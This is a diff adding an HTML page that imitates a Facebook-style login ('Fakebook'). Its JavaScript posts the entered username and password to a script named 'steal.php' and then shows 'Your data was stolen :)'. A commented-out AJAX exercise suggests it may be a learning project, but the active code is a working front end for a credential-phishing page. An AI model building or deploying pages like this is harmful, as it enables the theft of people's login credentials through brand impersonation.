@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+      body {
+        width: 100vw;
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+
+      form {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        width: 500px;
+        overflow: hidden;
+      }
+
+      form label {
+        font-size: 100px;
+        font-family: monospace;
+        font-weight: 900;
+        margin: 20px 0;
+        background-color: #000;
+        color: #fff;
+        padding: 10px 0;
+        width: 100%;
+      }
+
+      form label span {
+        background-color: blue;
+        color: #fff;
+        padding: 10px 20px;
+      }
+
+      form input {
+        width: 100%;
+        height: 50px;
+        margin: 10px 0;
+        padding: 0 20px;
+      }
+
+      .error {
+        background: rgba(255, 0, 0, 50%);
+        padding: 20px;
+        color: #fff;
+        font-size: 18px;
+        width: 100%;
+        border-left: 15px solid rgba(255, 0, 0, 50%);
+        transform: translateX(-100%);
+        transition: transform 0.25s ease-in;
+        /* display: none; */
+      }
+
+      .error.active {
+        transform: translateX(0%);
+        transition: transform 0.25s ease-in;
+      }
+    </style>
+</head>
+  <body>
+
+      <form action="#" id="form">
+        <div class="error" id="show">
+        </div>
+        <label><span>F</span>akebook</label>
+        <input type="text" name="username" placeholder="username">
+        <input type="text" name="password" placeholder="password">
+        <input type="submit" name="login" value="login" id="submitBtn">
+      </form>
+
+      <script>
+        let forms = document.getElementById('form')
+        let show = document.getElementById('show')
+        let btn = document.getElementById('submitBtn')
+
+        function prevSubmit(e) {
+          e.preventDefault()
+        }
+
+        // Message function
+        function errorPOP(message, bg, bl_bg){
+            show.style.borderLeft = `15px solid ${bl_bg}`
+            show.style.backgroundColor = bg
+            show.classList.add('active')
+
+            // Remove message after 2seconds
+            show.innerHTML = message
+            setTimeout(()=>{
+              show.classList.remove('active')
+              show.innerHTML = ""
+            },2000)
+        }
+
+        function errorBox(message){
+          if(message == "success"){
+            errorPOP("Your data was stolen :)","lime","green")
+          }else{
+            errorPOP(message,"rgba(255, 0, 0, 50%)","rgba(255, 0, 0, 60%)")
+          }
+        }
+
+        function sendData() {
+          let xhr = new XMLHttpRequest()
+          xhr.open('POST','steal.php',true)
+          xhr.onload = function() {
+            if(this.readyState === XMLHttpRequest.DONE){
+              if(this.status == 200){
+                let respond = this.response
+                errorBox(respond)
+              }
+            }
+          }
+          let data = new FormData(forms)
+          xhr.send(data)
+        }
+
+        forms.addEventListener('submit', prevSubmit)
+        btn.addEventListener('click', sendData)
+      </script>
+
+      <script>
+        // let ajaxBtn = document.getElementById('btn')
+        // let ajaxResponse = document.getElementById('ajax-response')
+        //
+        // function ajaxRES() {
+        //   // Create a XMLHttpRequest object
+        //   let xhr = new XMLHttpRequest()
+        //   // type filename async
+        //   xhr.open('GET','ajax.txt', true)
+        //
+        //   xhr.onload = function() {
+        //     // 200 OK
+        //     // 403 Fobidden
+        //     // 404 Not Found
+        //     if(this.status == 200){
+        //       ajaxResponse.innerHTML = this.responseText
+        //     }
+        //   }
+        //   xhr.send()
+        // }
+
+        // ajaxBtn.addEventListener('click', ajaxRES)
+      </script>
+  </body>
+</html>
